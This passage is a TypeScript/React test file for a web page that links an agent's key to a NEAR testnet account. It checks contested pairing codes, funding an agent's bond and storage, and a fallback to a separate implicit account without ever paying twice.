  const state = world();
  const { user, batches } = open(state);
  await getCode(user);
  agentAttaches(state);
  await screen.findByRole("button", { name: "Create agent" });

  // The agent's key tried the code after someone else's: the API says contested.
  if (state.code !== null) state.code.contestedAt = "2026-11-04T10:02:00.000Z";
  const contested = await screen.findByTestId("connect-contested");
  expect(contested.textContent).toContain(
    "Two different keys tried this code: someone else has it. Start over.",
  );
  expect(screen.queryByRole("button", { name: "Create agent" })).toBeNull();
  expect(screen.queryByTestId("connect-ready")).toBeNull();
  expect(screen.queryByTestId("connect-fingerprint")).toBeNull();
  // The polling stops: no read after the one that said contested.
  const reads = () => state.requests.filter((r) => r === `GET /v1/connect/codes/${ID}`).length;
  const seen = reads();
  await new Promise((resolve) => setTimeout(resolve, 200));
  expect(reads()).toBe(seen);
  expect(batches).toEqual([]);

  await user.click(within(contested).getByRole("button", { name: "Start over" }));
  expect(step(2).dataset.open).toBe("false");
  // The code's id is no longer kept: a reload starts afresh.
  expect(sessionStorage.getItem(`tender.connect.${ALICE}`)).toBeNull();
});

test("finish_an_agent_you_started_reads_where_it_stands_and_funds_what_is_missing", async () => {
  // writer.alice.testnet exists with the agent's key and its storage; its bond never arrived.
  const state = world();
  state.accounts.set(AGENT, [PUBLIC]);
  state.storage.add(AGENT);
  const { user, batches } = open(state);
  await user.type(await nameField(), "writer");
  await within(step(1)).findByText(`${AGENT} already exists.`);
  await user.click(screen.getByRole("button", { name: "Finish this agent" }));

  const finish = await screen.findByTestId("connect-finish");
  expect(screen.getByTestId("connect-name-state").textContent).toBe(`Finishing ${AGENT}.`);
  // Its one full-access key, by fingerprint, to match with what the agent printed.
  const keys = await within(finish).findByTestId("connect-finish-keys");
  expect(keys.textContent).toContain(connectFingerprint(PUBLIC));
  expect(within(finish).getByTestId("connect-finish-warning").textContent).toContain(
    "Fund it only if this is the fingerprint your agent printed",
  );
  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("wrong"));
  expect(state.made).toBe(0);

  await user.click(screen.getByRole("button", { name: "Fund agent" }));
  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("done"));
  // Only the bond: its storage was there.
  expect(batches.map((batch) => batch.map((tx) => tx.receiverId))).toEqual([[TOKEN]]);
  expect(state.vault.get(AGENT)).toBe(BOND);
  expect(screen.getByTestId("connect-finish-register").textContent).toContain(
    "pnpm agent:register --name writer",
  );

  // The agent registers; the index lists it.
  state.agents.set(AGENT, "active");
  await waitFor(() => expect(screen.getByTestId("tick-active").dataset.state).toBe("done"));
  expect(screen.getByTestId("connect-active").textContent).toContain("Your agent is active.");
  expect(state.made).toBe(0);
});

test("finish_an_agent_refuses_to_fund_an_account_with_more_than_one_full_access_key", async () => {
  const state = world();
  const other = `ed25519:${base58Encode(new Uint8Array(32).fill(5))}`;
  state.accounts.set(AGENT, [PUBLIC, other]);
  const { user, batches } = open(state);
  await user.type(await nameField(), "writer");
  await user.click(await screen.findByRole("button", { name: "Finish this agent" }));
  const keys = await screen.findByTestId("connect-finish-keys");
  expect(keys.textContent).toContain(connectFingerprint(other));
  const fund = screen.getByRole("button", { name: "Fund agent" });
  expect(fund.getAttribute("aria-disabled")).toBe("true");
  expect(screen.getByText(/This account has 2 full-access keys/)).toBeTruthy();
  await user.click(fund);
  expect(batches).toEqual([]);
});

test("a_reload_comes_back_to_the_code_by_its_id_and_never_keeps_the_code", async () => {
  const state = world();
  const first = open(state);
  await getCode(first.user);
  // What the tab keeps: the id and the name, never the code.
  const kept = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)));
  expect(kept).toContain(ID);
  expect(kept).not.toContain(CODE);
  cleanup();

  // The page again, as after a reload: the same code, read by its id; the agent attaches.
  agentAttaches(state);
  const second = aliceWallet(state);
  holder.store = createWalletStore(async () => fakeProvider(second.session, { restored: true }));
  render(<AddAgentView pollMs={20} />);
  await screen.findByTestId("connect-ready");
  expect(screen.getByTestId("connect-code-not-kept").textContent).toContain(
    "The code was shown before this page was reloaded, and it is not kept.",
  );
  expect(screen.queryByTestId("connect-command")).toBeNull();
  expect(state.made).toBe(1);
  expect((screen.getByLabelText("Account name") as HTMLInputElement).value).toBe("writer");
});

// ---- Fix round 2 ---------------------------------------------------------------------------------

test("create_reads_the_code_again_at_the_press_and_signs_nothing_for_a_code_contested_since", async () => {
  // The page reads the code once (the key is there at once) and not again for a minute: the
  // contest comes between that read and the press.
  const state = world();
  state.attachOnCreate = PUBLIC;
  const { user, batches } = open(state, { pollMs: 60_000 });
  await getCode(user);
  const create = await screen.findByRole("button", { name: "Create agent" });
  if (state.code !== null) state.code.contestedAt = "2026-11-04T10:02:00.000Z";

  await user.click(create);

  expect((await screen.findByTestId("connect-contested")).textContent).toContain(
    "Two different keys tried this code: someone else has it. Start over.",
  );
  expect(batches).toEqual([]);
  expect(state.accounts.has(AGENT)).toBe(false);
});

test("create_signs_nothing_when_the_key_changed_since_the_person_checked_it", async () => {
  const state = world();
  state.attachOnCreate = PUBLIC;
  const { user, batches } = open(state, { pollMs: 60_000 });
  await getCode(user);
  const create = await screen.findByRole("button", { name: "Create agent" });
  expect(screen.getByTestId("connect-fingerprint").textContent).toBe(connectFingerprint(PUBLIC));
  const other = `ed25519:${base58Encode(new Uint8Array(32).fill(5))}`;
  if (state.code !== null) state.code.attached = other;

  await user.click(create);

  expect((await screen.findByTestId("connect-send-error")).textContent).toBe(
    "Tender's answer changed just before your wallet was asked, so nothing was sent. Read the page again before you press anything.",
  );
  // The page now shows the key that is there, for the person to check again.
  expect(screen.getByTestId("connect-fingerprint").textContent).toBe(connectFingerprint(other));
  expect(batches).toEqual([]);
});

// ---- A separate account -----------------------------------------------------------------------

const SEPARATE = "Use a separate account instead (works with every wallet)";
const NOT_LISTED =
  "This agent is its own account, so Tender's directory won't list it under you as its provider.";

test("a_wallet_that_blocks_the_new_account_is_offered_a_separate_account_in_one_button", async () => {
  const state = world();
  const { user, batches, refused } = open(state, { refuseNewAccounts: true });
  await getCode(user);
  agentAttaches(state);
  await waitFor(() => expect(state.requests).toContain(`RPC ft_balance_of ${ALICE}`));
  await user.click(await screen.findByRole("button", { name: "Create agent" }));

  // The wallet refused the sub-account's transaction: nothing was sent, and the page says so plainly
  // and offers one way out.
  expect((await screen.findByTestId("connect-send-error")).textContent).toBe(
    "Your wallet didn't create the account. Nothing was paid. Press Create agent to try again.",
  );
  expect(refused).toHaveLength(1);
  expect(batches).toEqual([]);
  const offer = await screen.findByTestId("connect-implicit-offer");
  expect(offer.textContent).toContain(NOT_LISTED);
  expect(
    within(offer)
      .getAllByRole("button")
      .map((button) => button.textContent),
  ).toEqual([SEPARATE]);
  expect(state.requests).not.toContain(`POST /v1/connect/codes/${ID}/implicit`);

  await user.click(within(offer).getByRole("button", { name: SEPARATE }));

  // The API is told first, then ONE approval: NEAR to the agent's own implicit account (which a
  // transfer creates, with the agent's key), its storage and its bond, with no account set-up.
  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("done"));
  const told = state.requests.indexOf(`POST /v1/connect/codes/${ID}/implicit`);
  expect(told).toBeGreaterThan(-1);
  expect(batches).toEqual([
    [
      {
        receiverId: IMPLICIT,
        actions: [{ type: "Transfer", params: { deposit: "500000000000000000000000" } }],
      },
      {
        receiverId: CONTRACT,
        actions: [
          {
            type: "FunctionCall",
            params: {
              methodName: "storage_deposit",
              args: { account_id: IMPLICIT },
              gas: "10000000000000",
              deposit: "20000000000000000000000",
            },
          },
        ],
      },
      {
        receiverId: TOKEN,
        actions: [
          {
            type: "FunctionCall",
            params: {
              methodName: "ft_transfer_call",
              args: { receiver_id: CONTRACT, amount: "5000000", msg: `{"for":"${IMPLICIT}"}` },
              gas: "100000000000000",
              deposit: "1",
            },
          },
        ],
      },
    ],
  ]);
  expect(state.accounts.get(IMPLICIT)).toEqual([PUBLIC]);
  expect(state.vault.get(IMPLICIT)).toBe(BOND);
  expect(state.accounts.has(AGENT)).toBe(false);

  // The page says which account it is, and that the directory won't list it under the person.
  expect(screen.getByTestId("connect-ready").textContent).toBe(`Your agent is ready: ${IMPLICIT}`);
  expect(screen.getByTestId("connect-implicit").textContent).toBe(NOT_LISTED);
  expect(screen.queryByTestId("connect-implicit-offer")).toBeNull();
  expect(screen.getByTestId("tick-created").textContent).toContain(IMPLICIT);

  // The agent registers itself there; the index lists it.
  if (state.code !== null) state.code.agent = { status: "active" };
  await waitFor(() => expect(screen.getByTestId("tick-active").dataset.state).toBe("done"));
  expect(screen.getByTestId("connect-active").textContent).toContain(IMPLICIT);
  expect(batches).toHaveLength(1);
});

test("the_implicit_account_is_the_pages_own_and_an_answer_naming_another_is_never_signed", async () => {
  const state = world();
  state.lieImplicit =
    implicitAccountOf(`ed25519:${base58Encode(new Uint8Array(32).fill(9))}`) ?? "";
  const { user, batches } = open(state, { refuseNewAccounts: true });
  await getCode(user);
  agentAttaches(state);
  await waitFor(() => expect(state.requests).toContain(`RPC ft_balance_of ${ALICE}`));
  await user.click(await screen.findByRole("button", { name: "Create agent" }));
  await user.click(await screen.findByRole("button", { name: SEPARATE }));

  // The API moved the code, and named an account that is not the key's: nothing is signed.
  expect((await screen.findByTestId("connect-send-error")).textContent).toMatch(
    /Tender's answer changed just before your wallet was asked, so nothing was sent/,
  );
  await screen.findByTestId("connect-mismatch");
  expect(batches).toEqual([]);
  expect(screen.getByRole("button", { name: "Create agent" }).getAttribute("aria-disabled")).toBe(
    "true",
  );
});

test("a_wallet_that_refuses_the_transfer_too_is_told_and_create_agent_tries_the_separate_account", async () => {
  const state = world();
  const { user, batches, refused } = open(state, {
    refuseNewAccounts: true,
    refuseTransfers: true,
  });
  await getCode(user);
  agentAttaches(state);
  await waitFor(() => expect(state.requests).toContain(`RPC ft_balance_of ${ALICE}`));
  await user.click(await screen.findByRole("button", { name: "Create agent" }));
  await user.click(await screen.findByRole("button", { name: SEPARATE }));

  await waitFor(() => expect(refused).toHaveLength(2));
  expect((await screen.findByTestId("connect-send-error")).textContent).toBe(
    "Your wallet didn't create the account. Nothing was paid. Press Create agent to try again.",
  );
  // The choice is kept: no offer again, and the page names the separate account.
  await screen.findByTestId("connect-implicit");
  expect(screen.queryByTestId("connect-implicit-offer")).toBeNull();
  expect(refused[1]?.[0]?.receiverId).toBe(IMPLICIT);

  // Create agent now goes by the separate account: the same transfer, with no account set-up.
  await user.click(screen.getByRole("button", { name: "Create agent" }));
  await waitFor(() => expect(refused).toHaveLength(3));
  expect(refused[2]?.map((tx) => tx.receiverId)).toEqual([IMPLICIT, CONTRACT, TOKEN]);
  expect(JSON.stringify(refused[2])).not.toContain("CreateAccount");
  expect(batches).toEqual([]);
});

test("the_separate_account_press_reads_the_sub_account_again_and_never_pays_twice", async () => {
  // The page polls rarely here, so that what it shows is older than what is on the chain at the
  // press, as it may be for up to one poll.
  const state = world();
  state.attachOnCreate = PUBLIC;
  const { user, batches, refused } = open(state, { refuseNewAccounts: true, pollMs: 60_000 });
  await getCode(user);
  await waitFor(() => expect(state.requests).toContain(`RPC ft_balance_of ${ALICE}`));
  await user.click(await screen.findByRole("button", { name: "Create agent" }));
  const offer = await screen.findByTestId("connect-implicit-offer");

  // Storage and a bond reach Tender for the sub-account after the page looked (another tab, or a
  // wallet that sent part of an earlier approval late).
  state.storage.add(AGENT);
  state.vault.set(AGENT, BOND);
  await user.click(within(offer).getByRole("button", { name: SEPARATE }));

  expect(
    await screen.findByText(
      `Your bond and storage are waiting for ${AGENT}; they stay there until that account is created. Finish with a wallet that allows the setup step.`,
      { selector: '[data-testid="connect-send-error"]' },
    ),
  ).toBeTruthy();
  // Nothing was recorded or sent: the separate account would have paid the bond a second time.
  expect(state.requests).not.toContain(`POST /v1/connect/codes/${ID}/implicit`);
  expect(batches).toEqual([]);
  expect(refused).toHaveLength(1);
  expect(state.code?.kind ?? "sub_account").toBe("sub_account");
  await waitFor(() => expect(screen.queryByTestId("connect-implicit-offer")).toBeNull());
  expect(screen.getByTestId("connect-implicit-held")).toBeTruthy();

  // A sub-account that appears late keeps the agent the same way.
  cleanup();
  sessionStorage.clear();
  const late = world();
  late.attachOnCreate = PUBLIC;
  const second = open(late, { refuseNewAccounts: true, pollMs: 60_000 });
  await getCode(second.user);
  await waitFor(() => expect(late.requests).toContain(`RPC ft_balance_of ${ALICE}`));
  await second.user.click(await screen.findByRole("button", { name: "Create agent" }));
  const lateOffer = await screen.findByTestId("connect-implicit-offer");
  // The sub-account was made after all, with the agent's key: the agent keeps it, the page goes on
  // to step 4, and nothing is recorded or sent for a separate account.
  late.accounts.set(AGENT, [PUBLIC]);
  await second.user.click(within(lateOffer).getByRole("button", { name: SEPARATE }));
  await waitFor(() => expect(step(4).dataset.open).toBe("true"));
  expect(screen.getByTestId("tick-created").dataset.state).toBe("done");
  expect(late.requests).not.toContain(`POST /v1/connect/codes/${ID}/implicit`);
  expect(second.batches).toEqual([]);
});

test("a_plain_create_press_refuses_a_code_whose_account_kind_changed_since_the_page_showed_it", async () => {
  const state = world();
  state.attachOnCreate = PUBLIC;
  const { user, batches } = open(state, { pollMs: 60_000 });
  await getCode(user);
  await waitFor(() => expect(state.requests).toContain(`RPC ft_balance_of ${ALICE}`));
  const create = await screen.findByRole("button", { name: "Create agent" });
  expect(screen.getByTestId("connect-ready").textContent).toBe(`Your agent is ready: ${AGENT}`);

  // The code moves to the implicit account after the person looked (another tab, or the API).
  if (state.code !== null) state.code.kind = "implicit";
  await user.click(create);

  expect((await screen.findByTestId("connect-send-error")).textContent).toBe(
    "Tender's answer changed just before your wallet was asked, so nothing was sent. Read the page again before you press anything.",
  );
  expect(batches).toEqual([]);
  // The page now shows the account the code is for; a press from here goes by it.
  await waitFor(() =>
    expect(screen.getByTestId("connect-ready").textContent).toBe(
      `Your agent is ready: ${IMPLICIT}`,
    ),
  );
});

test("a_switch_tender_does_not_take_says_so_and_the_way_out_stays", async () => {
  for (const [status, words] of [
    [
      409,
      "Tender didn't take the separate account: the code changed meanwhile (another key tried it, or the agent registered). Nothing was sent. Read the page again.",
    ],
    [
      503,
      "Tender couldn't record the separate account just now, so nothing was sent. Press Use a separate account instead again in a moment.",
    ],
  ] as const) {
    cleanup();
    sessionStorage.clear();
    const state = world();
    state.refuseImplicit = status;
    const { user, batches } = open(state, { refuseNewAccounts: true });
    await getCode(user);
    agentAttaches(state);
    await waitFor(() => expect(state.requests).toContain(`RPC ft_balance_of ${ALICE}`));
    await user.click(await screen.findByRole("button", { name: "Create agent" }));
    await user.click(await screen.findByRole("button", { name: SEPARATE }));
    await waitFor(() => expect(screen.getByTestId("connect-send-error").textContent).toBe(words));
    expect(batches).toEqual([]);
    expect(screen.getByRole("button", { name: SEPARATE })).toBeTruthy();
  }
});

test("the_separate_account_after_a_failed_sub_account_try_pays_nothing_again", async () => {
  // The network fails the account; this wallet goes on, and the storage and the bond land for the
  // sub-account. Then Tender's record says the separate account (a lying API, or another tab).
  const state = world();
  state.failCreates = 1;
  const { user, batches } = open(state);
  await getCode(user);
  agentAttaches(state);
  await waitFor(() => expect(state.requests).toContain(`RPC ft_balance_of ${ALICE}`));
  await user.click(await screen.findByRole("button", { name: "Create agent" }));
  await screen.findByTestId("connect-implicit-held");
  expect(batches).toHaveLength(1);
  if (state.code !== null) state.code.kind = "implicit";
  await waitFor(() =>
    expect(screen.getByTestId("connect-ready").textContent).toBe(
      `Your agent is ready: ${IMPLICIT}`,
    ),
  );

  // The page says where the money is, the old words about the sub-account are gone, and Create
  // agent is off.
  const held = `Your bond and storage are waiting for ${AGENT}; they stay there until that account is created. Finish with a wallet that allows the setup step.`;
  expect((await screen.findByTestId("connect-other-held")).textContent).toBe(held);
  expect(screen.queryByText(/creates the account only/)).toBeNull();
  const create = screen.getByRole("button", { name: "Create agent" });
  expect(create.getAttribute("aria-disabled")).toBe("true");

  // A press that gets through anyway (the poll had not looked yet) reads the sub-account again at
  // the press, and pays nothing.
  state.storage.add(AGENT);
  await waitFor(() => expect(state.requests).toContain(`RPC storage_balance_of ${AGENT}`));
  await user.click(create);
  expect(batches).toHaveLength(1);
  expect(state.vault.get(IMPLICIT)).toBeUndefined();
  expect(state.storage.has(IMPLICIT)).toBe(false);
  expect(state.vault.get(AGENT)).toBe(BOND);
});

test("a_flip_back_to_the_sub_account_after_the_separate_account_was_paid_pays_nothing_again", async () => {
  const state = world();
  const { user, batches } = open(state, { refuseNewAccounts: true });
  await getCode(user);
  agentAttaches(state);
  await waitFor(() => expect(state.requests).toContain(`RPC ft_balance_of ${ALICE}`));
  await user.click(await screen.findByRole("button", { name: "Create agent" }));
  await user.click(await screen.findByRole("button", { name: SEPARATE }));
  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("done"));
  expect(batches).toHaveLength(1);
  expect(state.vault.get(IMPLICIT)).toBe(BOND);

  // Tender's record goes back to the sub-account (a lying API): the sub-account is not made, and
  // the page says the money is with the separate account.
  if (state.code !== null) state.code.kind = "sub_account";
  await waitFor(() =>
    expect(screen.getByTestId("connect-ready").textContent).toBe(`Your agent is ready: ${AGENT}`),
  );
  expect((await screen.findByTestId("connect-other-held")).textContent).toBe(
    `Your bond and storage are already waiting for ${IMPLICIT}, your agent's separate account, so nothing more is paid for ${AGENT}. Read the page again before you press anything.`,
  );
  const create = screen.getByRole("button", { name: "Create agent" });
  expect(create.getAttribute("aria-disabled")).toBe("true");
  await user.click(create);
  expect(batches).toHaveLength(1);
  expect(state.accounts.has(AGENT)).toBe(false);
  expect(state.vault.get(AGENT)).toBeUndefined();
});

test("finish_this_agent_pays_nothing_already_paid_for_its_keys_separate_account", async () => {
  // writer.alice.testnet exists with the agent's key and no bond; its key's separate account holds
  // storage and the bond from an earlier try.
  const state = world();
  state.accounts.set(AGENT, [PUBLIC]);
  state.storage.add(IMPLICIT);
  state.vault.set(IMPLICIT, BOND);
  const { user, batches } = open(state);
  await user.type(await nameField(), "writer");
  await within(step(1)).findByText(`${AGENT} already exists.`);
  await user.click(screen.getByRole("button", { name: "Finish this agent" }));
  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("wrong"));
  await user.click(screen.getByRole("button", { name: "Fund agent" }));
  expect((await screen.findByTestId("connect-fund-error")).textContent).toBe(
    `Your bond and storage are already waiting for ${IMPLICIT}, your agent's separate account, so nothing more is paid for ${AGENT}. Read the page again before you press anything.`,
  );
  expect(batches).toEqual([]);
});

test("fund_agent_on_the_separate_account_pays_nothing_while_the_sub_account_holds_a_bond", async () => {
  // Fund agent has no disabled state: only the press-time read of the other account stops it. The
  // code is on the separate account, which exists and lacks its bond; an earlier try left a bond
  // with writer.alice.testnet.
  const state = world();
  const { user, batches } = open(state);
  await getCode(user);
  state.accounts.set(IMPLICIT, [PUBLIC]);
  state.storage.add(IMPLICIT);
  state.vault.set(AGENT, BOND);
  if (state.code !== null) {
    state.code.attached = PUBLIC;
    state.code.kind = "implicit";
  }
  await waitFor(() => expect(step(4).dataset.open).toBe("true"));
  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("wrong"));
  const fund = screen.getByRole("button", { name: "Fund agent" });
  expect(fund.getAttribute("aria-disabled")).toBe("false");

  await user.click(fund);
  expect((await screen.findByTestId("connect-fund-error")).textContent).toBe(
    `A bond is waiting for ${AGENT}; it stays there until that account is created. Finish with a wallet that allows the setup step.`,
  );
  expect(batches).toEqual([]);
  expect(state.vault.get(IMPLICIT)).toBeUndefined();
});

test("a_strangers_storage_on_the_other_account_is_noted_and_blocks_nothing", async () => {
  // Someone paid 0.01 NEAR of Tender storage for writer.alice.testnet: the wallet still refuses the
  // sub-account, and the separate account is offered and paid for all the same.
  const state = world();
  state.storage.add(AGENT);
  const { user, batches } = open(state, { refuseNewAccounts: true });
  await getCode(user);
  agentAttaches(state);
  await waitFor(() => expect(state.requests).toContain(`RPC ft_balance_of ${ALICE}`));
  await user.click(await screen.findByRole("button", { name: "Create agent" }));
  const offer = await screen.findByTestId("connect-implicit-offer");
  expect(screen.queryByTestId("connect-implicit-held")).toBeNull();
  expect((await screen.findByTestId("connect-storage-note")).textContent).toBe(
    `Some storage is already paid for ${AGENT}; it stays with that account.`,
  );
  await user.click(within(offer).getByRole("button", { name: SEPARATE }));
  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("done"));
  expect(batches.map((batch) => batch.map((tx) => tx.receiverId))).toEqual([
    [IMPLICIT, CONTRACT, TOKEN],
  ]);

  // The mirror: storage someone paid for the agent's separate account does not stop the
  // sub-account either.
  cleanup();
  sessionStorage.clear();
  const mirror = world();
  mirror.storage.add(IMPLICIT);
  const second = open(mirror);
  await getCode(second.user);
  agentAttaches(mirror);
  await waitFor(() => expect(mirror.requests).toContain(`RPC ft_balance_of ${ALICE}`));
  expect((await screen.findByTestId("connect-storage-note")).textContent).toBe(
    `Some storage is already paid for ${IMPLICIT}; it stays with that account.`,
  );
  const create = screen.getByRole("button", { name: "Create agent" });
  expect(create.getAttribute("aria-disabled")).toBe("false");
  await second.user.click(create);
  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("done"));
  expect(second.batches.map((batch) => batch.map((tx) => tx.receiverId))).toEqual([
    [AGENT, CONTRACT, TOKEN],
  ]);
});
